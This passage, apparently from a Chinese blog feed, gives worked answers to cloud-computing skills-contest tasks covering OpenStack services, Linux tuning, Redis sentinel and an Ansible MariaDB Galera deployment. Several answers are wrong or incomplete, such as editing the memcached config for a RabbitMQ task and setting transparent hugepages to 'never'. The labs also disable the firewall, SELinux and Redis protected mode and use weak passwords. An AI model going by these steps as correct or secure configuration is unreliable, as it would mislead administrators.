compute@lvm#lvm-single-pool | nova              |+--------------------------------------+---------+------+-------------+-----------+--                                                                                                    ---------+--------------------+-----------------------------+-------------------+

过程：
#创建共享类型（不使用驱动程序支持）manila type-create default_share_type False#创建一个大小为 2G 的共享存储名为 share01 并开放share01 目录对 OpenStack 管理网段使用权限 manila   create NFS 2 --name share01 manila access-allow share01 ip 192.168.100.0/24 --access-level rw

【题目 14】Barbican 服务安装与使用[0.5 分]使用 iaas-install-barbican.sh 脚本安装 barbican 服务，安装服务完毕后，使用 openstack命令创建一个名为 secret01 的密钥，创建完成后提交控制节点的用户名、密码和 IP 地址到答题框。
1.检查 secret01 密钥创建正确计 0.5 分

[root@controller ~]# openstack secret list+------------------------------------------------------------------------+----------+---------------------------+--------+-----------------------------+-----------+------------+-------------+------+------------+| Secret href                                                            | Name     | Created                   | Status | Content types               | Algorithm | Bit length | Secret type | Mode | Expiration |+------------------------------------------------------------------------+----------+---------------------------+--------+-----------------------------+-----------+------------+-------------+------+------------+| http://controller:9311/v1/secrets/3ffdbd31-b33e-4298-b8c8-104601cd4a72 | secret01 | 2022-10-13T01:45:56+00:00 | ACTIVE | &#123;u&#x27;default&#x27;: u&#x27;text/plain&#x27;&#125; | aes       |        256 | opaque      | cbc  | None       |+------------------------------------------------------------------------+----------+---------------------------+--------+-----------------------------+-----------+------------+-------------+------+------------+

过程
openstack secret store --name secret01 --payload secretkey

【题目 15】Cloudkitty 服务安装与使用[1 分]使用 iaas-install-cloudkitty.sh 脚本安装 cloudkitty 服务，安装完毕后，启用 hashmap 评级模块，接着创建 volume_thresholds 组，创建服务匹配规则 volume.size，并设置每 GB 的价格为 0.01。接下来对应大量数据设置应用折扣，在组 volume_thresholds 中创建阈值，设置若超过 50GB 的阈值，应用 2%的折扣（0.98）。设置完成后提交控制节点的用户名、密码和 IP 地址到答题框。
1.检查 hashmap 评级模块启用成功计 0.2 分2.检查服务匹配规则 volume.size 创建成功 0.8 分

[root@controller ~]# cloudkitty hashmap service list+-------------+--------------------------------------+| Name        | Service ID                           |+-------------+--------------------------------------+| volume.size | 8e4db95b-45ae-44fd-87d5-424b0aac9614 |+-------------+--------------------------------------+[root@controller ~]#  openstack rating module enable hashmap+---------+---------+----------+| Module  | Enabled | Priority |+---------+---------+----------+| hashmap | True    |        1 |+---------+---------+----------+

过程：
#启动评级模块openstack rating module enable hashmap#创建组 cloudkitty hashmap group   create volume_thresholds +-------------------+--------------------------------------+| Name              | Group ID                             |+-------------------+--------------------------------------+| volume_thresholds | cac489fd-58b8-4de8-a4d3-08a0db1aa3d8 |+-------------------+--------------------------------------+#创建服务cloudkitty hashmap service create volume.size+-------------+--------------------------------------+| Name        | Service ID                           |+-------------+--------------------------------------+| volume.size | 8e4db95b-45ae-44fd-87d5-424b0aac9614 |+-------------+--------------------------------------+#创建匹配规则cloudkitty hashmap mapping create -s 8e4db95b-45ae-44fd-87d5-424b0aac9614 -t flat  -g cac489fd-58b8-4de8-a4d3-08a0db1aa3d8 0.01+--------------------------------------+-------+------------+------+----------+--------------------------------------+--------------------------------------+------------+| Mapping ID                           | Value | Cost       | Type | Field ID | Service ID                           | Group ID                             | Project ID |+--------------------------------------+-------+------------+------+----------+--------------------------------------+--------------------------------------+------------+| 65f9489f-035e-4bf7-8cf6-664fde0ca446 | None  | 0.01000000 | flat | None     | 8e4db95b-45ae-44fd-87d5-424b0aac9614 | cac489fd-58b8-4de8-a4d3-08a0db1aa3d8 | None       |+--------------------------------------+-------+------------+------+----------+--------------------------------------+--------------------------------------+------------+#创建阈值cloudkitty hashmap threshold create -s8e4db95b-45ae-44fd-87d5-424b0aac9614 -g cac489fd-58b8-4de8-a4d3-08a0db1aa3d8 -t rate 50 0.98+--------------------------------------+-------------+------------+------+----------+--------------------------------------+--------------------------------------+------------+| Threshold ID                         | Level       | Cost       | Type | Field ID | Service ID                           | Group ID                             | Project ID |+--------------------------------------+-------------+------------+------+----------+--------------------------------------+--------------------------------------+------------+| 3f5a8dfe-2ed8-4e1b-b617-a5bc7ef8a187 | 50.00000000 | 0.98000000 | rate | None     | 8e4db95b-45ae-44fd-87d5-424b0aac9614 | cac489fd-58b8-4de8-a4d3-08a0db1aa3d8 | None       |+--------------------------------------+-------------+------------+------+----------+--------------------------------------+--------------------------------------+------------+

【题目 16】OpenStack 平台内存优化[0.5 分]搭建完 OpenStack 平台后，关闭系统的内存共享，打开透明大页。完成后提交控制节点的用户名、密码和 IP 地址到答题框。
1.检查系统内存优化成功计 0.5 分

cat /sys/kernel/mm/transparent_hugepage/defragalways madvise [never]

过程
echo &#x27;never&#x27; &gt; /sys/kernel/mm/transparent_hugepage/defragcat /sys/kernel/mm/transparent_hugepage/defrag always madvise [never]

【题目 17】修改文件句柄数[0.5 分]Linux 服务器大并发时，往往需要预先调优 Linux 参数。默认情况下，Linux 最大文件句柄数为 1024 个。当你的服务器在大并发达到极限时，就会报出“too many open files”。创建一台云主机，修改相关配置，将控制节点的最大文件句柄数永久修改为 65535。配置完成后提交 controller 点的用户名、密码和 IP 地址到答题框。
1.检查配置 linux 系统句柄数为 65535 成功计 0.5 分

#临时生效ulimit -n 65535#永久生效vi /etc/security/limits.conf* soft nofile 65535* hard nofile 65535#查看ulimit -n

【题目 18】Linux 系统调优-防止 SYN 攻击[1 分]修改 controller 节点的相关配置文件，开启 SYN cookie，防止 SYN 洪水攻击。完成后提交 controller 节点的用户名、密码和 IP 地址到答题框。
1.检查开启 SYN cookie 配置计 1 分

vi /etc/sysctl.confnet.ipv4.tcp_max_syn_backlog=2048net.ipv4.tcp_syncookies=1net.ipv4.tcp_syn_retries = 0#配置生效sysctl -p

**【任务 **2】私有云服务运维[10分]【题目 1】OpenStack 开放镜像权限[0.5 分]使 用 OpenStack 私 有 云 平 台 ， 在 OpenStack 平台的 admin 项 目 中 使 用cirros-0.3.4-x86_64-disk.img 镜像文件创建名为 glance-cirros 的镜像，通过 OpenStack 命令将glance-cirros 镜像指定 demo 项目进行共享使用。配置完成后提交 controller 点的用户名、密码和 IP 地址到答题框。
1.检查 glance-cirros 镜像权限开放正确计 0.5 分

[root@controller ~]# openstack image add project glance-cirros demo+------------+--------------------------------------+| Field      | Value                                |+------------+--------------------------------------+| created_at | 2022-10-13T03:55:11Z                 || image_id   | 5e98f80e-34a0-40f7-981a-ef35bb3d673c || member_id  | cc5b38915a0343368e9e7b7560eeb6ca     || schema     | /v2/schemas/member                   || status     | pending                              || updated_at | 2022-10-13T03:55:11Z                 |+------------+--------------------------------------+

过程：
#上传镜像openstack image create glance-cirros --disk-format qcow2 --container bare --file cirros-0.3.4-x86_64-disk.img --project admin#对demo项目进行共享使用openstack image add project glance-cirros demo

【题目 2】OpenStack 消息队列调优[0.5 分]OpenStack 各服务内部通信都是通过 RPC 来交互，各 agent 都需要去连接 RabbitMQ；随着各服务 agent 增多，MQ 的连接数会随之增多，最终可能会到达上限，成为瓶颈。使用自行搭建的OpenStack私有云平台，分别通过用户级别、系统级别、配置文件来设置RabbitMQ服务的最大连接数为 10240，配置完成后提交修改节点的用户名、密码和 IP 地址到答题框。
1.检查 rabbitmq 服务最大连接数正确计 0.5 分

vi /etc/sysconfig/memcachedMAXCONN=&quot;10240&quot; #重启服务systemctl restart mecached

【题目 3】OpenStack Glance 镜像压缩[0.5 分]使用自行搭建的 OpenStack 平台。在 HTTP 服务中存在一个镜像为CentOS7.5-compress.qcow2 的镜像，请使用 qemu 相关命令，对该镜像进行压缩，压缩后的镜像命名为 chinaskill-js-compress.qcow2 并存放在&#x2F;root 目录下。完成后提交 controller 点的用户名、密码和 IP 地址到答题框。
1.检查镜像压缩正确计 0.5 分

qemu-img  convert -c -O qcow2 CentOS7.5-compress.qcow2 /root/chinaskill-js-compress.qcow2

【题目 4】glance 对接 cinder 后端存储[0.5 分]在自行搭建的 OpenStack平台中修改相关参数，使 glance 可以使用 cinder作为后端存储，将镜像存储于 cinder 卷中。使用 cirros-0.3.4-x86_64-disk.img 文件创建 cirros-image 镜像存储于 cirros-cinder 卷中，通过 cirros-image 镜像使用 cinder 卷启动盘的方式进行创建虚拟机。完成后提交修改节点的用户名、密码和 IP 地址到答题框。
1.检查修改 glance 后端存储为 cinder 正确计 0.5 分

[root@controller ~]# vi /etc/glance/glance-api.conf#show_multiple_locations = false改为show_multiple_locations = true[root@controller ~]# systemctl restart openstack-glance-*[root@controller ~]# vi /etc/cinder/cinder.conf#allowed_direct_url_schemes =改为allowed_direct_url_schemes =cinder#image_upload_use_internal_tenant = false改为image_upload_use_internal_tenant = true#最后重启cinder[root@controller ~]# systemctl restart openstack-cinderack-cinder-scheduler.service httpd代码不全,还差一些操作,只有一半的分

【题目 5】OpenStack Heat 运维：创建容器[0.5 分]在自行搭建的 OpenStack 私 有 云 平 台 上 ， 在 &#x2F;root 目录下编写 Heat 模 板create_container.yaml，要求执行 yaml 文件可以创建名为 heat-swift 的容器。完成后提交控制节点的用户名、密码和 IP 地址到答题框。（在提交信息前请准备好 yaml 模板执行的环境）
1.执行 heat 模板文件成功创建容器计 0.5 分

cat create_container.yamlheat_template_version: 2018-08-31description: create containerresources:  user:    type: OS::Swift::Container    properties:      name: heat-swift#运行模板测试heat stack-create -f create_container.yaml  heat-swift

【题目 6】OpenStack Nova 清除缓存[0.5 分]在 OpenStack 平台的一台计算节点创建虚拟机，若是第一次在该节点创建次虚拟机，会先将镜像文件复制到该计算节点录&#x2F;var&#x2F;lib&#x2F;nova&#x2F;instances&#x2F;_base。长期下来，该目录会占用比较大的磁盘空间而要清理。可以通过修改 nova 的配置文件来自动清理该缓存目录，即在该节点没有使用某镜像启动的云主机，那么这个镜像在过一定的时间后会被自动删除。配置完成后提交改动节点的用户名、密码和 IP 地址到答题框。
1.检查 nova 配置自动清理缓存文件正确计 0.5 分

vi /etc/nova/nova.conf[DEFAULT]]remove_unused_base_images=trueimage_cache_manager_interval=2400remove_unused_original_minimum_age_seconds=86400

【题目 7】Redis 一主二从三哨兵模式[1 分]使用提供的 OpenStack 私有云平台，申请三台 CentOS7.9 系统的云主机，使用提供的http 源，在三个节点自行安装 Redis 服务并启动，配置 Redis 的访问需要密码，密码设置为123456。然后将这三个 Redis 节点配置为 Redis 的一主二从三哨兵架构，即一个 Redis 主节点，两个从节点，三个节点均为哨兵节点。配置完成后提交 Redis 主节点的用户名、密码和IP 地址到答题框。
1.检查 redis 主从集群部署正确计 0.5 分2.检查 redis 集群部署为哨兵节点正确计 0.5 分

过程：
配置主从
#安装redisyum install -y redis #修改配置文件/etc/redis.conf1.先在网络部分注释掉单机连接那一行,即注释掉bind 127.0.0.1 2.同样我们要将后台运行打开：daemonize no，设置为yes。3.将 保护模式关闭：protected-mode yes 改为：protected-mode no 4.打开RDB持久化配置：#RDB持久化策略 默认三种方式，[900秒内有1次修改],#[300秒内有10次修改],[60秒内有10000次修改]即触发RDB持久化，#我们可以手动修改该参数或新增策略save 900 1save 300 10save 60 10000 #RDB文件名dbfilename dump.rdb#RDB文件存储路径dir ./策略配置：#在seconds秒内有changes次数据修改就触发RDB持久化5.开启AOF持久化配置appendonly yes#AOF文件名appendfilename &quot;appendonly.aof&quot;#AOF文件存储路径 与RDB是同一个参数,共用一个文件路径dir ./  #即bin目录下#AOF策略，一般都是选择第一种[always:每个命令都记录],#[everysec:每秒记录一次],[no:看机器的心情高兴了就记录，linux一般半个小时同步一次]#appendfsync alwaysappendfsync everysec# appendfsync no#aof文件大小比起上次重写时的大小,增长100%(配置可以大于100%)时,触发重写。#[假如上次重写后大小为10MB，当AOF文件达到20MB时也会再次触发重写，以此类推auto-aof-rewrite-percentage 100 #aof文件大小超过64MB*2时,触发重写，#为何要乘以2，因为auto-aof-rewrite-percentage 100 是翻倍即100%，#达到翻倍时才重写auto-aof-rewrite-min-size 64mb 6.打开混合持久化：#6.aof-use-rdb-preamble yes # 检查混合持久化是否打开，redis5.0后默认开启#将修改后的配置文件传到其他节点scp /etc/redis.conf root@slave1:/etc/redis.confscp /etc/redis.conf root@slave2:/etc/redis.conf#启动redis将slave各节点配置成从机systemctl start redis #配置slave1redis-cli -p 6379&gt; slaveof 192.168.200.101 6379&gt; info replication #配置slave2 redis-cli -p 6379&gt; slaveof 192.168.200.101 6379&gt; info replication#主节点查看配置是否成功redis-cli -p 6379&gt;info replication

配置三哨兵
#解压压缩包tar -zxvf redis-5.0.7.tar.gz -C /opt#修改配置文件vim /opt/redis-5.0.7/sentinel.confprotected-mode no								#17行，关闭保护模式port 26379										#21行，Redis哨兵默认的监听端口daemonize yes									#26行，指定sentinel为后台启动logfile &quot;/var/log/sentinel.log&quot;					#36行，指定日志存放路径dir &quot;/var/lib/redis/6379&quot;						#65行，指定数据库存放路径（没有这个文件夹需要手动创建）sentinel monitor mymaster 192.168.154.19 6379 2	#84行，修改 指定该哨兵节点监控192.168.184.10:6379这个主节点，该主节点的名称是mymaster，最后的2的含义与主节点的故障判定有关：至少需要2个哨兵节点同意，才能判定主节点故障并进行故障转移sentinel down-after-milliseconds mymaster 30000	#113行，判定服务器down掉的时间周期，默认30000毫秒（30秒）sentinel failover-timeout mymaster 180000		#146行，故障节点的最大超时时间为180000（180秒）#启动哨兵cd /opt/redis-5.0.7/redis-sentinel sentinel.conf &amp;#注意！先启动主服务器，再启动从服务器#查看信息redis-cli -p 26379 info Sentinel# Sentinelsentinel_masters:1sentinel_tilt:0sentinel_running_scripts:0sentinel_scripts_queue_length:0sentinel_simulate_failure_flags:0master0:name=mymaster,status=ok,address=192.168.58.30:6379,slaves=2,sentinels=3[1]+  完成                  redis-sentinel sentinel.conf



【题目 8】Redis 服务调优-AOF[1 分]使用上一题安装的 Redis 服务。在 Redis 中，AOF 配置为以三种不同的方式在磁盘上执行 write 或者 fsync。假设当前 Redis 压力过大，请配置 Redis 不执行 fsync。除此之外，避免AOF 文件过大，Redis 会进行 AOF 重写，生成缩小的 AOF 文件。请修改配置，让 AOF 重写时，不进行 fsync 操作。配置完成后提交 Redis 节点的用户名、密码和 IP 地址到答题框。
1.检查配置 redis 不执行 fsync 正确计 0.5 分、2.检查配置 redis 进行 AOF 重写不执行 fsync 正确计 0.5 分

[root@master ~]# vim /etc/redis.confno-appendfsync-on-rewrite noaof-rewrite-incremental-fsync yes#连个参数分别改为aof-rewrite-incremental-fsync nono-appendfsync-on-rewrite yes#配置就是设置为yes时候，在aof重写期间会停止aof的fsync操作[root@master ~]# systemctl restart redis

【题目 9】应用部署：堡垒机部署[0.5 分]使用提供的 OpenStack 平台申请一台 CentOS7.9 的云主机，使用提供的软件包安装JumpServer 堡垒机服务，并配置使用该堡垒机对接自己安装的 controller 和 compute 节点。完成后提交 JumpServer 节点的用户名、密码和 IP 地址到答题框。
1.检查堡垒机部署正确计 0.5 分

【题目 10】skywalking 服务部署与应用[1 分]使用提供的 OpenStack 私有云平台，申请一台 centos7.9 系统的云主机，使用提供的软件包安装 Elasticsearch 服务和 skywalking 服务，将 skywalking 的 UI 访问端口修改为 8888。接下来再申请一台CentOS7.9 的云主机，用于搭建gpmall 商城应用，并配置SkyWalking Agent， 将 gpmall 的 jar 包放置探针并启动。安装与配置完成后提交 skywalking 节点的用户名、密码和 IP 地址到答题框。登录物理OpenStack平台，使用CentOS7.9镜像创建两台云主机（node-1，mall），云主机类型使用4VCPU&#x2F;8GB内存&#x2F;100GB硬盘。创建后的云主机作为本次案例的实验节点。
1.检查 skywalking 服务部署正确计 1 分



【题目 11】Linux 内核优化[1 分]在使用 Linux 服务器的时候，TCP 协议规定，对于已经建立的连接，网络双方要进行四次挥手才能成功断开连接，如果缺少了其中某个步骤，将会使连接处于假死状态，连接本身占用的资源不会被释放。因为服务器程序要同时管理大量连接，所以很有必要保证无用的连接完全断开，否则大量僵死的连接会浪费许多服务器资源。创建一台 CentOS7.9 云主机，修改相应的配置文件，分别开启 SYN Cookies；允许将 TIME-WAIT sockets 重新用于新的 TCP 连接；开启TCP 连接中TIME-WAIT sockets 的快速回收；修改系統默认的 TIMEOUT 时间为 30。完成后提交修改节点的用户名、密码和 IP 地址到答题框。
vim /etc/sysctl.conf#添加如下参数net.ipv4.tcp_syncookies = 1net.ipv4.tcp_tw_reuse = 1net.ipv4.tcp_tw_recycle = 1net.ipv4.tcp_fin_timeout = 30sysctl -pnet.bridge.bridge-nf-call-iptables = 1net.bridge.bridge-nf-call-ip6tables = 1net.ipv4.tcp_syncookies = 1net.ipv4.tcp_tw_reuse = 1net.ipv4.tcp_tw_recycle = 1net.ipv4.tcp_fin_timeout = 30

【任务 3】私有云运维开发[10 分]【题目 1】Ansible 服务部署：部署 MariaDB 集群[2 分]使用OpenStack 私有云平台，创建 4 台系统为centos7.9 的云主机，其中一台作为 Ansible 的母机并命名为 ansible，另外三台云主机命名为 node1、node2、node3；使用这一台母机， 编写 Ansible 脚本（在&#x2F;root 目录下创建 example 目录作为 Ansible 工作目录，部署的入口文件命名为 cscc_install.yaml ） ， 对其他三台云主机进行安装高可用数据库集群（MariaDB_Galera_cluster，数据库密码设置为 123456）的操作（所需的安装包在 HTTP 服务中）。完成后提交 Ansible 节点的用户名、密码和 IP 地址到答题框。（考试系统会连接到你的Ansible 节点，去执行 Ansible 脚本，请准备好 Ansible 运行环境，以便考试系统访问）
（1）环境准备
①ansible部署#1.创建工作目录mkdir examplecd examplevi ansible.cfg[defaults]inventory = /root/example/inventory   ###声明主机组remote_user = root#创建主机组vi inventory  ###设置主机组，便于后面“when模块”进行筛选使用[node1]node1[node2]node2[node3]node3#将公钥进行上传#2.创建roles目录，编写playbook mkdir roles cd roles/ #生成role ansible-galaxy init mariadb-galera-cluster cd mariadb-galera-cluster  #编写file cd files #vi mariadb.repo[mariadb]name = MariaDBbaseurl = http://yum.mariadb.org/10.4/centos7-amd64gpgkey=https://yum.mariadb.org/RPM-GPG-KEY-MariaDBgpgcheck=1 #vi server1.cnf(需要创建三个server1,server2,server3，把&quot;wsrep_node_name=&quot;,“wsrep_node_address=”替换即可)[mysqld]datadir=/var/lib/mysqlsocket=/var/lib/mysql/mysql.sockbind-address=0.0.0.0user=mysqldefault_storage_engine=InnoDBinnodb_autoinc_lock_mode=2innodb_flush_log_at_trx_commit=0innodb_buffer_pool_size=128Mbinlog_format=ROWlog-error=/var/log/mysqld.log[galera]wsrep_on=ONwsrep_provider=/usr/lib64/galera-4/libgalera_smm.sowsrep_node_name=&#x27;galera1&#x27;wsrep_node_address=&quot;192.168.93.11&quot;wsrep_cluster_name=&#x27;galera-cluster&#x27;wsrep_cluster_address=&quot;gcomm://192.168.93.11,192.168.93.12,192.168.93.13&quot;wsrep_provider_options=&quot;gcache.size=300M; gcache.page_size=300M&quot;wsrep_slave_threads=4wsrep_sst_method=rsync cd tasks #编写yum.yml vi yum.yml- name: mv yum#若联网无需删除，但需修改repo添加repo  shell: &#x27;mv /etc/yum.repos.d/* /etc/yum&#x27;- name: copy mariadb-repo   copy: src=mariadb.repo dest=/etc/yum.repos.d/mariadb.repo- name: change repo   shell: sed -i &#x27;s#yum\.mariadb\.org#mirrors.ustc.edu.cn/mariadb/yum#&#x27; /etc/yum.repos.d/mariadb.repo- name: install mariadb.galera.mysql-python  shell: &#x27;yum install -y MariaDB-server MariaDB-client rsync&#x27;     #编写service.yml- name: start node1 mariadb  service: name=mariadb state=started enabled=yes- name: set node1 mysql_user  shell: mysqladmin -uroot password 123456- name: copy node1 config  copy: src=roles/mariadb-galera-cluster/files/server1.cnf dest=/etc/my.cnf.d/server.cnf  when: &quot;&#x27;node1&#x27; in group_names&quot;- name: copy node2 config  copy: src=roles/mariadb-galera-cluster/files/server2.cnf dest=/etc/my.cnf.d/server.cnf  when: &quot;&#x27;node2&#x27; in group_names&quot;- name: copy node3 config  copy: src=roles/mariadb-galera-cluster/files/server3.cnf dest=/etc/my.cnf.d/server.cnf  when: &quot;&#x27;node3&#x27; in group_names&quot;- name: stop node1 mariadb  service: name=mariadb state=stopped  when: &quot;&#x27;node1&#x27; in group_names&quot;- name: start node1 galera  shell: galera_new_cluster  when: &quot;&#x27;node1&#x27; in group_names&quot;- name: restart node2 mariadb  service: name=mariadb state=restarted  when: &quot;&#x27;node2&#x27; in group_names&quot;- name: restart node3 mariadb  service: name=mariadb state=restarted  when: &quot;&#x27;node3&#x27; in group_names&quot;  #########这里面有个mysql_user模块，通过“ansible-doc -s mysql_user”来查看这个模块的不详细信息#编写 main.ymlvi main.yml- include: install.yml- include: service.yml#编写入口文件vi cscc_install.yaml- hosts: all  remote_user: root  roles:  - mariadb-galera-cluster

#文件在文档test
②手动部署https://blog.csdn.net/networken/article/details/106297814#关闭防火墙systemctl disable --now firewalldsed -i &#x27;s/^SELINUX=enforcing$/SELINUX=disabled/&#x27; /etc/selinux/config &amp;&amp; setenforce 0#修改主机名hostnamectl set-hostname xxx#修改主机名解析cat &gt;&gt; /etc/hosts &lt;&lt;EOF192.168.93.11 galera1192.168.93.12 galera2192.168.93.13 galera3EOF#配置yum源cat &gt; /etc/yum.repos.d/mariadb.repo &lt;&lt;EOF[mariadb]name = MariaDBbaseurl = http://yum.mariadb.org/10.4/centos7-amd64gpgkey=https://yum.mariadb.org/RPM-GPG-KEY-MariaDBgpgcheck=1EOF#替换为中科大源sed -i &#x27;s#yum\.mariadb\.org#mirrors.ustc.edu.cn/mariadb/yum#&#x27; /etc/yum.repos.d/mariadb.repo#安装mariadb、galera和rsync,其中galera作为依赖自动安装yum install -y MariaDB-server MariaDB-client rsync#配置节点1cat &gt; /etc/my.cnf.d/server.cnf &lt;&lt;EOF[mysqld]datadir=/var/lib/mysqlsocket=/var/lib/mysql/mysql.sockbind-address=0.0.0.0user=mysqldefault_storage_engine=InnoDBinnodb_autoinc_lock_mode=2innodb_flush_log_at_trx_commit=0innodb_buffer_pool_size=128Mbinlog_format=ROWlog-error=/var/log/mysqld.log[galera]wsrep_on=ONwsrep_provider=/usr/lib64/galera-4/libgalera_smm.sowsrep_node_name=&#x27;galera1&#x27;wsrep_node_address=&quot;192.168.93.11&quot;wsrep_cluster_name=&#x27;galera-cluster&#x27;wsrep_cluster_address=&quot;gcomm://192.168.93.11,192.168.93.12,192.168.93.13&quot;wsrep_provider_options=&quot;gcache.size=300M; gcache.page_size=300M&quot;wsrep_slave_threads=4wsrep_sst_method=rsyncEOF#配置节点二cat &gt; /etc/my.cnf.d/server.cnf &lt;&lt;EOF[mysqld]datadir=/var/lib/mysqlsocket=/var/lib/mysql/mysql.sockbind-address=0.0.0.0user=mysqldefault_storage_engine=InnoDBinnodb_autoinc_lock_mode=2innodb_flush_log_at_trx_commit=0innodb_buffer_pool_size=128Mbinlog_format=ROWlog-error=/var/log/mysqld.log[galera]wsrep_on=ONwsrep_provider=/usr/lib64/galera-4/libgalera_smm.sowsrep_node_name=&#x27;galera2&#x27;wsrep_node_address=&quot;192.168.93.12&quot;wsrep_cluster_name=&#x27;galera-cluster&#x27;wsrep_cluster_address=&quot;gcomm://192.168.93.11,192.168.93.12,192.168.93.13&quot;wsrep_provider_options=&quot;gcache.size=300M; gcache.page_size=300M&quot;wsrep_slave_threads=4wsrep_sst_method=rsyncEOF#配置节点三：cat &gt; /etc/my.cnf.d/server.cnf &lt;&lt;EOF[mysqld]datadir=/var/lib/mysqlsocket=/var/lib/mysql/mysql.sockbind-address=0.0.0.0user=mysqldefault_storage_engine=InnoDBinnodb_autoinc_lock_mode=2innodb_flush_log_at_trx_commit=0innodb_buffer_pool_size=128Mbinlog_format=ROWlog-error=/var/log/mysqld.log[galera]wsrep_on=ONwsrep_provider=/usr/lib64/galera-4/libgalera_smm.sowsrep_node_name=&#x27;galera3&#x27;wsrep_node_address=&quot;192.168.93.13&quot;wsrep_cluster_name=&#x27;galera-cluster&#x27;wsrep_cluster_address=&quot;gcomm://192.168.93.11,192.168.93.12,192.168.93.13&quot;wsrep_provider_options=&quot;gcache.size=300M; gcache.page_size=300M&quot;wsrep_slave_threads=4wsrep_sst_method=rsyncEOF#启动集群galera_new_clustersystemctl enable mariadb#另外两个systemctl enable --now mariadb验证集群状态，默认未配置密码直接回车：[root@galera1 ~]# mysql -uroot -p -e &quot;SHOW STATUS LIKE &#x27;wsrep_cluster_size&#x27;&quot;Enter password: +--------------------+-------+| Variable_name      | Value |+--------------------+-------+| wsrep_cluster_size | 3     |+--------------------+-------+

]]></content>
      <categories>
        <category>云计算</category>
        <category>技能大赛汇总</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>云计算职业技能大赛</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算方向-2023年金砖一带一路职业技能大赛云计算赛题</title>
    <url>/posts/a182640a.html</url>
    <content><![CDATA[A场次题目：Openstack 平台部署与运维任务1 私有云平台环境初始化1.初始化操作系统 使用提供的用户名密码，登录竞赛云平台。根据表 1 中的 IP 地址规划，设置各服务器节点的 IP 地址，确保网络正常通信，设置控制节点主机名为 Contro ller，计算节点主机名为 Compute，并修改 hosts 文件将 IP 地址映射为主机名， 关闭防火墙并设置为开机不启动，设置 SELinux 为 Permissive 模式并设置永久 关闭。请查看控制节点和计算节点主机名，使用命令查看 SELinux 状态，使用 head 命令、tail 命令和 cut 命令提取出永久关闭 SELinux 的关键信息。 将以上命令及返回结果提交到答题框

配置host
vi /etc/hosts127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4::1         localhost localhost.localdomain localhost6 localhost6.localdomain6172.17.31.10	controller172.17.31.20	compute

关闭防火墙并设置为开机不启动
systemctl stop firewalldsystemctl disable firewalld

关闭selinux并永久关闭
setenforce 0vi /etc/selinux/config SELINUX=Permissive

使用命令查看selinux状态
getenforce Disabled

2.挂载安装光盘镜像 将提供的 CentOS-7-x86_64-DVD-1804.iso 和 chinaskills_cloud_iaas.iso 光盘镜像上传到 Controller 节点 &#x2F;root 目录下，然后在 &#x2F;opt 目录下使用一条 命令创建&#x2F;centos 目录和&#x2F;iaas 目录，并将镜像文件 CentOS-7-x86_64-DVD-1804. iso 挂载到 &#x2F;centos 目录下，将镜像文件 chinaskills_cloud_iaas.iso 挂载到 &#x2F;iaas 目录下。 请将以上命令及返回结果返回到答题框。【1 分】
mkdir /opt/centosmkdir /opt/iaasmount chinaskills_cloud_iaas.iso /opt/iaasmount CentOS-7-x86_64-DVD-1804.iso /opt/centos

3.搭建文件共享服务器在Controller节点上安装 vsftp 服务器设置开机自启动,请将以上命令 及返回结果提交到答题框。【0.5 分】
#在controller节点yum install -y vsftpdvi /etc/vsftpd/vsftpd.conf  anon_root=/opt/systemctl start vsftpdsystemctl enable vsftpd

4.设置 yum 源 
将 ftp 仓库设置为 &#x2F;opt&#x2F;，为 controller 节点设置本地 yum 源，yum 源文件名为 local.repo；为 compute 配置 ftp 源，yum 源文件名称为 ftp.repo,其中ftp服务器地址为 controller 节点 IP.请将两个节点的 yum 源文件内容提交到答题框。【0.5 分】 
#在controller节点mv /etc/yum.repos.d/* /etc/yumvi /etc/yum.repos.d/local.repo[centos]name=centosbaseurl=file:///opt/centosgpgcheck=0enabled=1[iaas]name=iaasbaseurl=file:///opt/iaas/iaas-repo#在compute节点mv /etc/yum.repos.d/* /etc/yumvi /etc/yum.repos.d/ftp.repo[centos]name=centosbaseurl=ftp://172.17.31.10/centosgpgcheck=0enabled=1[iaas]name=iaasbaseurl=ftp://172.17.31.20/iaas/iaas-repo

5.部署时间同步服务器 
在 Controller 节点上部署 chrony 服务器，允许其他节点同步时间，启动服务并设置为开机启动；在 compute 节点上指定 controller 节点为上游 NTP 服务器，重启服务并设为开机启动。
 请在控制节点上使用 chronyc 命令同步控制节点的系统时间。【1 分】
#在centroller节点
 vi /etc/chrony.conf  # Use public servers from the pool.ntp.org project.# Please consider joining the pool (http://www.pool.ntp.org/join.html).#server 0.centos.pool.ntp.org iburst#server 1.centos.pool.ntp.org iburst#server 2.centos.pool.ntp.org iburst#server 3.centos.pool.ntp.org iburstserver controller iburst# Record the rate at which the system clock gains/losses time.driftfile /var/lib/chrony/drift# Allow the system clock to be stepped in the first three updates# if its offset is larger than 1 second.makestep 1.0 3# Enable kernel synchronization of the real-time clock (RTC).rtcsync# Enable hardware timestamping on all interfaces that support it.#hwtimestamp *# Increase the minimum number of selectable sources required to adjust# the system clock.#minsources 2# Allow NTP client access from local network.#allow 192.168.0.0/16# Serve time even if not synchronized to a time source.#local stratum 10# Specify file containing keys for NTP authentication.#keyfile /etc/chrony.keys# Specify directory for log files.logdir /var/log/chrony# Select which information is logged.#log measurements statistics trackingallow 172.17.31.0/24local stratum 10systemctl restart chronydsystemctl enable chronyd

在compute节点
vi /etc/chrony.conf# Use public servers from the pool.ntp.org project.# Please consider joining the pool (http://www.pool.ntp.org/join.html).#server 0.centos.pool.ntp.org iburst#server 1.centos.pool.ntp.org iburst#server 2.centos.pool.ntp.org iburst#server 3.centos.pool.ntp.org iburstserver controller iburst# Record the rate at which the system clock gains/losses time.driftfile /var/lib/chrony/drift# Allow the system clock to be stepped in the first three updates# if its offset is larger than 1 second.makestep 1.0 3# Enable kernel synchronization of the real-time clock (RTC).rtcsync# Enable hardware timestamping on all interfaces that support it.#hwtimestamp *# Increase the minimum number of selectable sources required to adjust# the system clock.#minsources 2# Allow NTP client access from local network.#allow 192.168.0.0/16# Serve time even if not synchronized to a time source.#local stratum 10# Specify file containing keys for NTP authentication.#keyfile /etc/chrony.keys# Specify directory for log files.logdir /var/log/chrony# Select which information is logged.#log measurements statistics trackingsystemctl restart chronydsystemctl enable chronyd

任务二 Openstack 搭建任务1.修改变量文件在控制节点和计算节点上分别安装 iaas-xiandian 软件包，修改配置脚本文件中基本变量（配置脚本文件为&#x2F;etc&#x2F;xiandian&#x2F;openrc.sh）。修改完成后使用命令生效该变量文件，然后执行 echo $INTERFACE_IP 命令。 
请将命令和返回结果提交到答题框。【0.5 分】
